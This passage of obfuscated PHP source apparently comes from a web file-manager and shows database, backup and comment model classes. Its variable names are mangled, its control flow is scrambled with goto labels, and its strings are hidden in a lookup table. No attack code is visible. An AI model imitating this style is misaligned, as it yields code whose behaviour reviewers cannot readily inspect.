(!$e∑äÌÇÛß±) { return parent::save($Fÿ„ÂÀ∞Ω™, $d¡úÎÂ‰Üí); } $A∏œèç⁄Û¢ = 0; goto DëπåôÂ—⁄; F◊≤ö§™¿Ã: } public function add($eı≈ÿıóû® = '', $F€î„–è¯´ = array(), $D≈Õúæœ∞√ = false) { if ($this->addTaskStatus && is_array($eı≈ÿıóû®)) { $this->addTaskData[] = $eı≈ÿıóû®; return; } return parent::add($eı≈ÿıóû®, $F€î„–è¯´, $D≈Õúæœ∞√); } private $addTaskStatus = false; private $addTaskData = array(); public function addTaskStart() { $this->addTaskStatus = !0; $this->addTaskData = array(); } public function addTaskEnd() { if (!$this->addTaskStatus) { return; } $this->addAll($this->addTaskData); $this->addTaskStatus = !1; $this->addTaskData = array(); } public function select($bëéÈÏ©Ï⁄ = array()) { goto AÏòçµÊπÕ; bÇ¬í‰≈’œ: $fË˘íò◊ﬁÓ = null; for ($bÉËÁ∫ã‚ï = 0; $bÉËÁ∫ã‚ï < count($bêﬁ¨ÖÜâ¯); $bÉËÁ∫ã‚ï += $e†ì∑˘Ñ¿Ã) { $aá¡ùÖèúΩ = array_slice($bêﬁ¨ÖÜâ¯, $bÉËÁ∫ã‚ï, $e†ì∑˘Ñ¿Ã); if (!is_array($aá¡ùÖèúΩ) || count($aá¡ùÖèúΩ) == 0) { break; } $e”Æüò¶•Ú[$f—æùÈ·ÿ“[262]][$dÀ¬≥ÍÇùﬁ][1] = $aá¡ùÖèúΩ; $this->optionsValue($e”Æüò¶•Ú); $c¥À¯¥ˆ¢” = parent::select($bëéÈÏ©Ï⁄); if (!$c¥À¯¥ˆ¢”) { continue; } if (is_null($fË˘íò◊ﬁÓ)) { $fË˘íò◊ﬁÓ = array(); } $fË˘íò◊ﬁÓ = array_merge($fË˘íò◊ﬁÓ, $c¥À¯¥ˆ¢”); } return $fË˘íò◊ﬁÓ; goto Däﬂ–°•üÇ; d⁄Õç∞©ÜÆ: $dÀ¬≥ÍÇùﬁ = $this->findWhereField($e”Æüò¶•Ú); if (!$dÀ¬≥ÍÇùﬁ || isset($e”Æüò¶•Ú[$f—æùÈ·ÿ“[279]]) || isset($e”Æüò¶•Ú[$f—æùÈ·ÿ“[338]])) { return parent::select($bëéÈÏ©Ï⁄); } $bêﬁ¨ÖÜâ¯ = $e”Æüò¶•Ú[$f—æùÈ·ÿ“[262]][$dÀ¬≥ÍÇùﬁ][1]; goto bÇ¬í‰≈’œ; AÏòçµÊπÕ: $f—æùÈ·ÿ“ =& $_SERVER[∞„˜ƒÑºª]; $e†ì∑˘Ñ¿Ã = self::SQL_WHERE_IN_CHUNK; $e”Æüò¶•Ú = $this->optionsValue(); goto d⁄Õç∞©ÜÆ; Däﬂ–°•üÇ: } public function delete($e∫éœûƒëΩ = array()) { goto E£◊Û°Ù«ù; E¶Ë›¿ˆÿó: $cÖá¡éËƒÃ = $fïÛÌÎâÓ[$AµâÜˆÊÍõ[262]][$D…ÊÃêŒ∆ø][1]; for ($f∏üµœŸ∏Ã = 0; $f∏üµœŸ∏Ã < count($cÖá¡éËƒÃ); $f∏üµœŸ∏Ã += $cçî≤„ƒ«ò) { $Fîà´´Æ…ï = array_slice($cÖá¡éËƒÃ, $f∏üµœŸ∏Ã, $cçî≤„ƒ«ò); if (!is_array($Fîà´´Æ…ï) || count($Fîà´´Æ…ï) == 0) { break; } $fïÛÌÎâÓ[$AµâÜˆÊÍõ[262]][$D…ÊÃêŒ∆ø][1] = $Fîà´´Æ…ï; $this->optionsValue($fïÛÌÎâÓ); $FËµ£∞ÓÑÒ += parent::delete($e∫éœûƒëΩ); } return $FËµ£∞ÓÑÒ; goto e∑π®ì±ä ; fıÜß—ºõã: $D…ÊÃêŒ∆ø = $this->findWhereField($fïÛÌÎâÓ); if (!$D…ÊÃêŒ∆ø) { return parent::delete($e∫éœûƒëΩ); } $FËµ£∞ÓÑÒ = 0; goto E¶Ë›¿ˆÿó; E£◊Û°Ù«ù: $AµâÜˆÊÍõ =& $_SERVER[∞„˜ƒÑºª]; $cçî≤„ƒ«ò = self::SQL_WHERE_IN_CHUNK; $fïÛÌÎâÓ = $this->optionsValue(); goto fıÜß—ºõã; e∑π®ì±ä : } private function findWhereField($E˘ËŸøÁ¯¯) { $eπ€ÂöÛ≥Ù =& $_SERVER[∞„˜ƒÑºª]; $E‰Èà÷à® = self::SQL_WHERE_IN_CHUNK; if (!is_array($E˘ËŸøÁ¯¯) || !is_array($E˘ËŸøÁ¯¯[$eπ€ÂöÛ≥Ù[262]])) { return !1; } foreach ($E˘ËŸøÁ¯¯[$eπ€ÂöÛ≥Ù[262]] as $Cëì≥≥æﬁ¨ => $bÍØñü¯≥˘) { if (is_array($bÍØñü¯≥˘) && isset($bÍØñü¯≥˘[0]) && is_string($bÍØñü¯≥˘[0]) && strtolower($bÍØñü¯≥˘[0]) == $eπ€ÂöÛ≥Ù[7] && is_array($bÍØñü¯≥˘[1]) && count($bÍØñü¯≥˘[1]) > $E‰Èà÷à®) { ignore_timeout(); return $Cëì≥≥æﬁ¨; } } return !1; } } class ModelBaseLight { public $optionType = ''; public $modelType = "\123\171\163\x74\x65\x6d\x4f\x70\x74\151\157\156"; public $field = array(); public function listData($B≥ËÓò¨ª“ = false, $eì≈“±Û—Ô = "\x6d\157\x64\151\146\x79\124\x69\x6d\x65", $f•©…Œ¬ƒè = false) { $Cíé∏«‹ìò = Model($this->modelType)->get(!1, $this->optionType, !0); if (!$B≥ËÓò¨ª“) { $Cíé∏«‹ìò = array_filter(array_values($Cíé∏«‹ìò)); return array_sort_by($Cíé∏«‹ìò, $eì≈“±Û—Ô, $f•©…Œ¬ƒè); } return $Cíé∏«‹ìò[$_SERVER[∞„˜ƒÑºª][363] . $B≥ËÓò¨ª“]; } public function insert($D‘€Ïø”ÀÇ) { goto Fµ≤èÌ‚Ω ; fŒ™ŒÓÈ¨“: $D‘€Ïø”ÀÇ[$Eê®øè»™û[109]] = time(); Model($this->modelType)->set($Eê®øè»™û[364], $C¿âû¨ΩëÉ, $this->optionType . $Eê®øè»™û[365]); Model($this->modelType)->set($Eê®øè»™û[363] . $C¿âû¨ΩëÉ, $D‘€Ïø”ÀÇ, $this->optionType); goto EÇ≤Æ˜Û€‡; e™§∑Ñ¶ÏÔ: $C¿âû¨ΩëÉ = $C¿âû¨ΩëÉ ? $C¿âû¨ΩëÉ : 0; $D‘€Ïø”ÀÇ[$Eê®øè»™û[366]] = ++$C¿âû¨ΩëÉ; $D‘€Ïø”ÀÇ[$Eê®øè»™û[183]] = time(); goto fŒ™ŒÓÈ¨“; Fµ≤èÌ‚Ω : $Eê®øè»™û =& $_SERVER[∞„˜ƒÑºª]; $D‘€Ïø”ÀÇ = array_field_key($D‘€Ïø”ÀÇ, $this->field); $C¿âû¨ΩëÉ = Model($this->modelType)->get($Eê®øè»™û[364], $this->optionType . $Eê®øè»™û[365]); goto e™§∑Ñ¶ÏÔ; EÇ≤Æ˜Û€‡: return $C¿âû¨ΩëÉ; goto eÛíùÂ„ú§; eÛíùÂ„ú§: } public function update($b«Ö∂®®ªä, $aƒ≤ÔÔŸã) { goto cºÛåÜäâ‰; cºÛåÜäâ‰: $cπâ´î—âÛ =& $_SERVER[∞„˜ƒÑºª]; $aƒ≤ÔÔŸã = array_field_key($aƒ≤ÔÔŸã, $this->field); $aπÌöëˆËØ = $this->listData($b«Ö∂®®ªä); goto Cæ—Æ÷∂≥ì; c´Á†±∑ÆÇ: return Model($this->modelType)->set($cπâ´î—âÛ[363] . $b«Ö∂®®ªä, $aƒ≤ÔÔŸã, $this->optionType); goto eòÍ†ŸŸÉë; Cæ—Æ÷∂≥ì: if (!$aπÌöëˆËØ) { return !1; } $aƒ≤ÔÔŸã = array_merge($aπÌöëˆËØ, $aƒ≤ÔÔŸã); $aƒ≤ÔÔŸã[$cπâ´î—âÛ[109]] = time(); goto c´Á†±∑ÆÇ; eòÍ†ŸŸÉë: } public function remove($b´®Ωœ‹ç”) { return Model($this->modelType)->remove($_SERVER[∞„˜ƒÑºª][363] . $b´®Ωœ‹ç”, $this->optionType); } public function clear() { $fòÙ∞¬∫£‘ =& $_SERVER[∞„˜ƒÑºª]; Model($this->modelType)->remove($fòÙ∞¬∫£‘[364], $this->optionType . $fòÙ∞¬∫£‘[365]); return Model($this->modelType)->remove(null, $this->optionType); } public function findByKey($E»Ææ“∫·Ï, $E–èäæöêΩ) { if (!$E–èäæöêΩ) { return !1; } $f∂¢Ω∫±é´ = $this->listData(); $f∂¢Ω∫±é´ = array_to_keyvalue($f∂¢Ω∫±é´, $E»Ææ“∫·Ï); return isset($f∂¢Ω∫±é´[$E–èäæöêΩ]) ? $f∂¢Ω∫±é´[$E–èäæöêΩ] : !1; } public function findByName($E°∫ßç“ß™) { return $this->findByKey($_SERVER[∞„˜ƒÑºª][28], $E°∫ßç“ß™); } protected function resetData($a’µŒÇ È≈) { $f†Æ¯ÊçΩﬂ =& $_SERVER[∞„˜ƒÑºª]; $CÿÉèàÖÊ€ = array(); for ($Fû‚∫üÏÖ— = 0; $Fû‚∫üÏÖ— < count($a’µŒÇ È≈); $Fû‚∫üÏÖ—++) { $CÿÉèàÖÊ€[$f†Æ¯ÊçΩﬂ[363] . $a’µŒÇ È≈[$Fû‚∫üÏÖ—][$f†Æ¯ÊçΩﬂ[366]]] = $a’µŒÇ È≈[$Fû‚∫üÏÖ—]; } return Model($this->modelType)->set($CÿÉèàÖÊ€, !1, $this->optionType); } private function getAutoName($cö∆¿ˆ¿§‹) { $d√Ó–Øá¬Õ = array_to_keyvalue(parent::listData(), $_SERVER[∞„˜ƒÑºª][28]); if (!$d√Ó–Øá¬Õ || !isset($d√Ó–Øá¬Õ[$cö∆¿ˆ¿§‹])) { return $cö∆¿ˆ¿§‹; } for ($C≤‰°…ªÊÉ = 1; $C≤‰°…ªÊÉ < count($d√Ó–Øá¬Õ); $C≤‰°…ªÊÉ++) { $Bûí≠°üìì = $cö∆¿ˆ¿§‹ . "\x28{$C≤‰°…ªÊÉ}\51"; if (!isset($d√Ó–Øá¬Õ[$Bûí≠°üìì])) { return $Bûí≠°üìì; } } return $Bûí≠°üìì; } } goto D«⁄†¯Ê≠ë; Eê≥†‹úú≠: class BackupModel extends ModelBaseLight { public $optionType = "\123\171\163\164\x65\155\x2e\x62\141\143\x6b\165\x70\114\151\163\164"; public $field = array("\151\157", "\x6e\141\x6d\x65", "\x73\x74\141\164\165\x73", "\143\x6f\156\164\x65\x6e\x74", "\162\x65\163\165\x6c\x74", "\x74\151\x6d\x65\106\x72\157\x6d", "\164\151\155\145\124\x6f"); public function config() { goto eÒçèãö»£; eÒçèãö»£: $DﬁÒ∏ç‘ê =& $_SERVER[∞„˜ƒÑºª]; $eÍΩüÔî‘´ = Model($DﬁÒ∏ç‘ê[812])->get($DﬁÒ∏ç‘ê[467]); $eÍΩüÔî‘´ = json_decode($eÍΩüÔî‘´, !0); goto eñÆú‚çç‚; CØéúˆ’∏À: if (isset($A‹∞ÃîÿÛ[$DﬁÒ∏ç‘ê[186]])) { $A‹∞ÃîÿÛ[$DﬁÒ∏ç‘ê[186]] = json_decode($A‹∞ÃîÿÛ[$DﬁÒ∏ç‘ê[186]], !0); } if (isset($eÍΩüÔî‘´[$DﬁÒ∏ç‘ê[186]])) { $A‹∞ÃîÿÛ[$DﬁÒ∏ç‘ê[186]][$DﬁÒ∏ç‘ê[1038]] = $eÍΩüÔî‘´[$DﬁÒ∏ç‘ê[186]]; unset($eÍΩüÔî‘´[$DﬁÒ∏ç‘ê[186]]); } return array_merge($A‹∞ÃîÿÛ, $eÍΩüÔî‘´); goto c∆Õ‘£∞ïØ; aµ›á¯œæ≠: Action($DﬁÒ∏ç‘ê[1538])->taskInit(); $fÓ√Ñ¡¡∑å = Model($DﬁÒ∏ç‘ê[1539])->listData(); foreach ($fÓ√Ñ¡¡∑å as $DΩƒ¬Ü”îÒ) { if ($DΩƒ¬Ü”îÒ[$DﬁÒ∏ç‘ê[804]] == $DﬁÒ∏ç‘ê[376] && $DΩƒ¬Ü”îÒ[$DﬁÒ∏ç‘ê[1051]] == $DﬁÒ∏ç‘ê[1540]) { $A‹∞ÃîÿÛ = $DΩƒ¬Ü”îÒ; break; } } goto CØéúˆ’∏À; eñÆú‚çç‚: $eÍΩüÔî‘´ = is_array($eÍΩüÔî‘´) ? $eÍΩüÔî‘´ : array(); if (!isset($eÍΩüÔî‘´[$DﬁÒ∏ç‘ê[448]])) { $eÍΩüÔî‘´[$DﬁÒ∏ç‘ê[448]] = $DﬁÒ∏ç‘ê[402]; } $A‹∞ÃîÿÛ = array(); goto aµ›á¯œæ≠; c∆Õ‘£∞ïØ: } public function listData($a¿ÊÉø∆«÷ = false, $EË·¿≤À˜ = "\155\x6f\144\x69\146\x79\x54\x69\155\145", $EÜœË∏óﬁ± = false) { return parent::listData($a¿ÊÉø∆«÷, $EË·¿≤À˜, !0); } public function lastItem() { $DÉﬁËÖÜåä = $this->listData(); return !empty($DÉﬁËÖÜåä[0]) ? $DÉﬁËÖÜåä[0] : null; } public function kill($A›ûÁ»ÕÒÎ) { goto CÉÌâπèù; CÉÌâπèù: $fèˆî‰ä™∏ =& $_SERVER[∞„˜ƒÑºª]; $fıä„àñ’Í = $this->listData($A›ûÁ»ÕÒÎ); if (!$fıä„àñ’Í || empty($fıä„àñ’Í[$fèˆî‰ä™∏[28]])) { return !0; } goto cË©ó“á÷©; DÂ¢ÏÃÔáœ: return $this->remove($A›ûÁ»ÕÒÎ); goto eïÓÖÇÌµﬂ; cË©ó“á÷©: Task::kill($fèˆî‰ä™∏[466]); Task::kill($fèˆî‰ä™∏[496]); Task::kill($fèˆî‰ä™∏[504]); goto DÜíçû√ˆ›; DÜíçû√ˆ›: $bË’€‚óË≠ = $fıä„àñ’Í[$fèˆî‰ä™∏[28]]; $e÷˜é∂¶œµ = TEMP_FILES . $fèˆî‰ä™∏[474] . $bË’€‚óË≠ . $fèˆî‰ä™∏[8]; IO::remove($e÷˜é∂¶œµ, !1); goto DÂ¢ÏÃÔáœ; eïÓÖÇÌµﬂ: } public function remove($DÁçÏ©≠’Ø) { $a≥ ‹ÈãÛô = $this->listData($DÁçÏ©≠’Ø); if (!$a≥ ‹ÈãÛô) { return !0; } return $this->backupRemove($a≥ ‹ÈãÛô); } private function backupRemove($CÛÿ‘â Ù«) { $cá®éÛ≈“˘ =& $_SERVER[∞„˜ƒÑºª]; parent::remove($CÛÿ‘â Ù«[$cá®éÛ≈“˘[366]]); $eˆËÔ…Ì‡Ç = "\173\x69\x6f\72{$CÛÿ‘â Ù«[$cá®éÛ≈“˘[447]]}\x7d\57\x64\x61\164\141\x62\x61\163\x65\57" . $CÛÿ‘â Ù«[$cá®éÛ≈“˘[28]]; IO::remove($eˆËÔ…Ì‡Ç, !1); return !0; } public function start() { goto eËıûÖ≈†ò; CˆÉﬂÕÈ‚Œ: return !0; goto E®«⁄¶¥Áß; dó˘Û∞üé∞: if (Hook::trigger($Cò¡Îíƒ∂î[1541]) == $Cò¡Îíƒ∂î[1542]) { return !0; } $b‚‘⁄”ÛÍ· = $this->process(); foreach ($b‚‘⁄”ÛÍ· as $DƒÔÉ“ñàë) { if ($DƒÔÉ“ñàë) { return Task::restart($DƒÔÉ“ñàë[$Cò¡Îíƒ∂î[366]]); } } goto E£¬Íº◊›Ã; E£¬Íº◊›Ã: $B®Éñä‹‹Ç = new Backup(); $B®Éñä‹‹Ç->keep(); if (!$B®Éñä‹‹Ç->db()) { return !1; } goto b¨ ¶ê“‡õ; b¨ ¶ê“‡õ: if (!$B®Éñä‹‹Ç->dbFile()) { return !1; } if ($e⁄‹Ω∞‹ÖÉ[$Cò¡Îíƒ∂î[448]] == $Cò¡Îíƒ∂î[402]) { $B®Éñä‹‹Ç->file(); } Backup::set(array($Cò¡Îíƒ∂î[445] => 1, $Cò¡Îíƒ∂î[459] => time())); goto CˆÉﬂÕÈ‚Œ; eËıûÖ≈†ò: $Cò¡Îíƒ∂î =& $_SERVER[∞„˜ƒÑºª]; $e⁄‹Ω∞‹ÖÉ = $this->config(); if (!$e⁄‹Ω∞‹ÖÉ || $e⁄‹Ω∞‹ÖÉ[$Cò¡Îíƒ∂î[1036]] != $Cò¡Îíƒ∂î[376]) { return !1; } goto dó˘Û∞üé∞; E®«⁄¶¥Áß: } public function process() { $b√‚ï¡›•ô =& $_SERVER[∞„˜ƒÑºª]; return array($b√‚ï¡›•ô[450] => Task::get($b√‚ï¡›•ô[466]), $b√‚ï¡›•ô[453] => Task::get($b√‚ï¡›•ô[496]), $b√‚ï¡›•ô[163] => Task::get($b√‚ï¡›•ô[504])); } public function restore() { $DëÖÊøÚëÀ =& $_SERVER[∞„˜ƒÑºª]; ActionCall($DëÖÊøÚëÀ[1543], !0, 1); ActionCall($DëÖÊøÚëÀ[1543], !0, 0); } } class CommentModel extends ModelBase { protected $tableName = "\143\x6f\155\x6d\x65\x6e\x74"; protected $tableMeta = array("\164\x61\x62\x6c\x65\116\141\x6d\145" => "\143\x6f\x6d\155\145\156\x74\137\x6d\145\164\141", "\155\x65\164\x61\x46\151\x65\x6c\144" => "\143\157\x6d\x6d\145\156\164\111\x44"); const TYPE_SOURCE = 1; const TYPE_SHARE = 2; const TYPE_USER = 3; const TYPE_GROUP = 4; const TYPE_TOPIC = 5; public static $TYPEALL = array(self::TYPE_SOURCE, self::TYPE_SHARE, self::TYPE_USER, self::TYPE_GROUP, self::TYPE_TOPIC); public function addComment($Bª¯≠òÛÌ√) { $C’Öï∫©ΩÃ =& $_SERVER[∞„˜ƒÑºª]; if ($Bª¯≠òÛÌ√[$C’Öï∫©ΩÃ[1544]]) { $bªùÉ‰´Ñâ = $this->where(array($C’Öï∫©ΩÃ[1545] => $Bª¯≠òÛÌ√[$C’Öï∫©ΩÃ[1544]]))->find(); if (!$bªùÉ‰´Ñâ || $bªùÉ‰´Ñâ[$C’Öï∫©ΩÃ[393]] != $Bª¯≠òÛÌ√[$C’Öï∫©ΩÃ[393]] || $bªùÉ‰´Ñâ[$C’Öï∫©ΩÃ[395]] != $Bª¯≠òÛÌ√[$C’Öï∫©ΩÃ[395]]) { return !1; } $this->where(array($C’Öï∫©ΩÃ[1545] => $Bª¯≠òÛÌ√[$C’Öï∫©ΩÃ[1544]]))->setAdd($C’Öï∫©ΩÃ[1546], 1); } return $this->add($Bª¯≠òÛÌ√); } public function remove($bΩïπ∞»ÑÚ) { $eÀÆÏäŸå˜ =& $_SERVER[∞„˜ƒÑºª]; $fà•≥öå–¯ = array($eÀÆÏäŸå˜[1545] => $bΩïπ∞»ÑÚ); $a‡é°ú∆”∑ = $this->where($fà•≥öå–¯)->find(); if ($a‡é°ú∆”∑[$eÀÆÏäŸå˜[1544]]) { $this->where(array($eÀÆÏäŸå˜[1545] => $a‡é°ú∆”∑[$eÀÆÏäŸå˜[1544]]))->setAdd($eÀÆÏäŸå˜[1546], -1); } return $this->where($fà•≥öå–¯)->delete(); } public function edit($Dƒ∑üª ¶», $dº≤¯ÜëÁ’) { $Däıìá“ò° =& $_SERVER[∞„˜ƒÑºª]; $d∂‘ ”Í∑ﬂ = array($Däıìá“ò°[1545] => $Dƒ∑üª ¶»); return $this->where($d∂‘ ”Í∑ﬂ)->save(array($Däıìá“ò°[1547] => $dº≤¯ÜëÁ’)); } public function prasise($AÆÿ›æ¡≤ˆ) { $AÒ€‚Æ„ÀÜ =& $_SERVER[∞„˜ƒÑºª]; $Bêô∏®àî = Model($AÒ€‚Æ„ÀÜ[1548]); $dﬂ°∞¨ôë‚ = array($AÒ€‚Æ„ÀÜ[1545] => $AÆÿ›æ¡≤ˆ, $AÒ€‚Æ„ÀÜ[1054] => USER_ID); $b«‚ú“Ÿåñ = $Bêô∏®àî->where($dﬂ°∞¨ôë‚)->find(); if (!$b«‚ú“Ÿåñ) { $Bêô∏®àî->add($dﬂ°∞¨ôë‚); $cúäØÁñéÇ = $this->where(array($AÒ€‚Æ„ÀÜ[1545] => $AÆÿ›æ¡≤ˆ))->setAdd($AÒ€‚Æ„ÀÜ[1549], 1); } else { $Bêô∏®àî->where($dﬂ°∞¨ôë‚)->delete(); $cúäØÁñéÇ = $this->where(array($AÒ€‚Æ„ÀÜ[1545] => $AÆÿ›æ¡≤ˆ))->setAdd($AÒ€‚Æ„ÀÜ[1549], -1); } return $cúäØÁñéÇ; } public function targetInfo($D≤’ëËó‘ˆ, $Aòç›ıÕüØ) { goto aë∏·ºæ î; D¡ÍŒ§Á…§: $Aá∆Ì´∏Æ° = "\122\x49\x47\110\124\40\112\x4f\111\116\x20{$this->tablePrefix}\143\x6f\x6d\155\145\156\164\x5f\x70\162\141\x69\x73\x65\x20\163\x74\141\x72\x20\x6f\x6e\40\x63\x6f\x6d\155\145\156\164\56\143\157\x6d\155\145\156\x74\x49\104\40\75\x20\163\164\x61\x72\56\143\157\155\155\145\156\x74\x49\104"; $e◊ô÷…±äπ = $this->alias($cŒ”„¯îÜò[339])->where($D–»¥πúé)->join($Aá∆Ì´∏Æ°, $cŒ”„¯îÜò[1550])->count(); $eº¬éµ…éÿ = array($cŒ”„¯îÜò[1551] => $DêÛíËîÕÇ, $cŒ”„¯îÜò[1552] => $e◊ô÷…±äπ); goto B´Ÿâ™§“Ò; aë∏·ºæ î: $cŒ”„¯îÜò =& $_SERVER[∞„˜ƒÑºª]; $D–»¥πúé = array($cŒ”„¯îÜò[392] => $D≤’ëËó‘ˆ, $cŒ”„¯îÜò[394] => $Aòç›ıÕüØ); $DêÛíËîÕÇ = $this->where($D–»¥πúé)->count(); goto D¡ÍŒ§Á…§; B´Ÿâ™§“Ò: return $eº¬éµ…éÿ; goto eƒ∆·◊Çú”; eƒ∆·◊Çú”: } public function listData($D¯äÒ‘Ï±è) { $E«ˆÖÂÑÍè =& $_SERVER[∞„˜ƒÑºª]; if (isset($D¯äÒ‘Ï±è[$E«ˆÖÂÑÍè[1553]])) { if ($D¯äÒ‘Ï±è[$E«ˆÖÂÑÍè[1553]]) { $D¯äÒ‘Ï±è[$E«ˆÖÂÑÍè[1554]] = array($E«ˆÖÂÑÍè[688], intval($D¯äÒ‘Ï±è[$E«ˆÖÂÑÍè[1553]])); } unset($D¯äÒ‘Ï±è[$E«ˆÖÂÑÍè[1553]]); } if (isset($D¯äÒ‘Ï±è[$E«ˆÖÂÑÍè[1555]])) { if ($D¯äÒ‘Ï±è[$E«ˆÖÂÑÍè[1555]]) { $D¯äÒ‘Ï±è[$E«ˆÖÂÑÍè[1554]] = array($E«ˆÖÂÑÍè[685], intval($D¯äÒ‘Ï±è[$E«ˆÖÂÑÍè[1555]])); } unset($D¯äÒ‘Ï±è[$E«ˆÖÂÑÍè[1555]]); } return $this->_listData($D¯äÒ‘Ï±è); } private function _listData($büÚôâáÉı) { $e®¢≈¡Ãî∏ =& $_SERVER[∞„˜ƒÑºª]; $c‰ãÍêƒ≈º = $this->where($büÚôâáÉı)->_makeOrder()->selectPage(100); $this->_listAppendParent($c‰ãÍêƒ≈º[$e®¢≈¡Ãî∏[354]]); $this->_listAppendUser($c‰ãÍêƒ≈º[$e®¢≈¡Ãî∏[354]]); $this->_listAppendMeta($c‰ãÍêƒ≈º[$e®¢≈¡Ãî∏[354]]); return $c‰ãÍêƒ≈º; } private function _makeOrder() { $BıﬂüÎßÁ° =& $_SERVER[∞„˜ƒÑºª]; $b©Ÿäº¯Á¯ = array($BıﬂüÎßÁ°[1549], $BıﬂüÎßÁ°[1546], $BıﬂüÎßÁ°[183]); $CÔ“√π‘ÖÎ = Input::get($BıﬂüÎßÁ°[1556], $BıﬂüÎßÁ°[7], $BıﬂüÎßÁ°[1557], $b©Ÿäº¯Á¯); $DÇ∆¨é›È£ = Input::get($BıﬂüÎßÁ°[1558], $BıﬂüÎßÁ°[7], $BıﬂüÎßÁ°[1056], array($BıﬂüÎßÁ°[1559], $BıﬂüÎßÁ°[1560])); $aÒ÷¿∫Â”≥ = $CÔ“√π‘ÖÎ . $BıﬂüÎßÁ°[50] . $DÇ∆¨é›È£; return $this->order($aÒ÷¿∫Â”≥); } private function _listAppendParent(&$CÎ»ÊéäÏ›) { goto aÓëÃ™úõ∞; eª◊ìÑÌ™®: if (!$Cƒ•∑◊êËÑ) { return; } $eóë”ÌŸØ¯ = $this->where(array($D±∫°ŒÊŸı[1545] => array($D±∫°ŒÊŸı[7], $Cƒ•∑◊êËÑ)))->select(); $eóë”ÌŸØ¯ = array_to_keyvalue($eóë”ÌŸØ¯, $D±∫°ŒÊŸı[1554]); goto C‹éç⁄û⁄ô; aÓëÃ™úõ∞: $D±∫°ŒÊŸı =& $_SERVER[∞„˜ƒÑºª]; $Cƒ•∑◊êËÑ = array_unique(array_to_keyvalue($CÎ»ÊéäÏ›, $D±∫°ŒÊŸı[33], $D±∫°ŒÊŸı[1544])); $Cƒ•∑◊êËÑ = array_remove_value($Cƒ•∑◊êËÑ, $D±∫°ŒÊŸı[402]); goto eª◊ìÑÌ™®; C‹éç⁄û⁄ô: foreach ($CÎ»ÊéäÏ› as &$a¬·”ùÇñº) { if (isset($eóë”ÌŸØ¯[$a¬·”ùÇñº[$D±∫°ŒÊŸı[1544]]])) { $a¬·”ùÇñº[$D±∫°ŒÊŸı[1561]] = $eóë”ÌŸØ¯[$a¬·”ùÇñº[$D±∫°ŒÊŸı[1544]]]; } } goto d‹îûìàıà; d‹îûìàıà: } private function _listAppendUser(&$c¿£øœ„û) { goto AΩ†ÁÀ∑¨ ; CÃßîÊ≤ãœ: foreach ($c¿£øœ„û as &$FÃÍ•¥·≥π) { $FÃÍ•¥·≥π[$CÕ÷ÈØÀ≥œ[415]] = $DëçÜÖŒµ±[$FÃÍ•¥·≥π[$CÕ÷ÈØÀ≥œ[1063]]]; if (isset($FÃÍ•¥·≥π[$CÕ÷ÈØÀ≥œ[1561]])) { $FÃÍ•¥·≥π[$CÕ÷ÈØÀ≥œ[1561]][$CÕ÷ÈØÀ≥œ[415]] = $DëçÜÖŒµ±[$FÃÍ•¥·≥π[$CÕ÷ÈØÀ≥œ[1561]][$CÕ÷ÈØÀ≥œ[1063]]]; } } goto cî˘ÿŸçÍÛ; AΩ†ÁÀ∑¨ : $CÕ÷ÈØÀ≥œ =& $_SERVER[∞„˜ƒÑºª]; $dÿ¬àèŸ¿◊ = array_unique(array_to_keyvalue($c¿£øœ„û, $CÕ÷ÈØÀ≥œ[33], $CÕ÷ÈØÀ≥œ[1063])); $dÿ¬àèŸ¿◊ = array_remove_value($dÿ¬àèŸ¿◊, $CÕ÷ÈØÀ≥œ[402]); goto dàÎ∆ê’á¨; dàÎ∆ê’á¨: if (count($dÿ¬àèŸ¿◊) == 0) { return; } foreach ($c¿£øœ„û as $FÃÍ•¥·≥π) { if (isset($FÃÍ•¥·≥π[$CÕ÷ÈØÀ≥œ[1561]])) { $dÿ¬àèŸ¿◊[] = $FÃÍ•¥·≥π[$CÕ÷ÈØÀ≥œ[1561]][$CÕ÷ÈØÀ≥œ[1063]]; } } $DëçÜÖŒµ± = Model($CÕ÷ÈØÀ≥œ[1451])->userListInfo($dÿ¬àèŸ¿◊); goto CÃßîÊ≤ãœ; cî˘ÿŸçÍÛ: } private function _listAppendMeta(&$f“ì√±‰‘û) { goto E¨Ã†ı“≠∑; A† Œ˘§à¬: if (!$a°›…£”∆Ç) { return !1; } foreach ($f“ì√±‰‘û as &$FåÇ’€¥Æ•) { $FåÇ’€¥Æ•[$dÉ‘¢Ã¡–¡[1562]] = $a°›…£”∆Ç[$FåÇ’€¥Æ•[$dÉ‘¢Ã¡–¡[1554]]]; if (isset($FåÇ’€¥Æ•[$dÉ‘¢Ã¡–¡[1561]])) { $FåÇ’€¥Æ•[$dÉ‘¢Ã¡–¡[1561]][$dÉ‘¢Ã¡–¡[1562]] = $a°›…£”∆Ç[$FåÇ’€¥Æ•[$dÉ‘¢Ã¡–¡[1561]][$dÉ‘¢Ã¡–¡[1554]]]; } } goto bÂõ÷©âè»; FâøÑØ⁄∆€: if (!$Aíƒ‘≤ñ˘‘) { return; } foreach ($f“ì√±‰‘û as $FåÇ’€¥Æ•) { if (isset($FåÇ’€¥Æ•[$dÉ‘¢Ã¡–¡[1561]])) { $Aíƒ‘≤ñ˘‘[] = $FåÇ’€¥Æ•[$dÉ‘¢Ã¡–¡[1561]][$dÉ‘¢Ã¡–¡[1554]]; } } $a°›…£”∆Ç = $this->metaList($Aíƒ‘≤ñ˘‘); goto A† Œ˘§à¬; E¨Ã†ı“≠∑: $dÉ‘¢Ã¡–¡ =& $_SERVER[∞„˜ƒÑºª]; $Aíƒ‘≤ñ˘‘ = array_unique(array_to_keyvalue($f“ì√±‰‘û, $dÉ‘¢Ã¡–¡[33], $dÉ‘¢Ã¡–¡[1554])); $Aíƒ‘≤ñ˘‘ = array_remove_value($Aíƒ‘≤ñ˘‘, $dÉ‘¢Ã¡–¡[402]); goto FâøÑØ⁄∆€; bÂõ÷©âè»: } private function metaList($F∂…Ã◊úÇ€) { goto eëñìí…∏√; B≈–¥ŒæÁå: $e’ƒ√˜√÷ê = Model($Dﬁﬁ«êÃÜè[1563])->where($a¯äú∆Û”«)->select(); $e’ƒ√˜√÷ê = array_to_keyvalue_group($e’ƒ√˜√÷ê, $Dﬁﬁ«êÃÜè[1554]); foreach ($e’ƒ√˜√÷ê as $fÁ∞ºÙ∞Ó˜ => $eøã†âÇ£ù) { $a≠Âƒ•Í√∞ = array(); foreach ($eøã†âÇ£ù as $Bù⁄Ñ¡óÓ¢) { $a≠Âƒ•Í√∞[$Bù⁄Ñ¡óÓ¢[$Dﬁﬁ«êÃÜè[96]]] = $Bù⁄Ñ¡óÓ¢[$Dﬁﬁ«êÃÜè[357]]; } 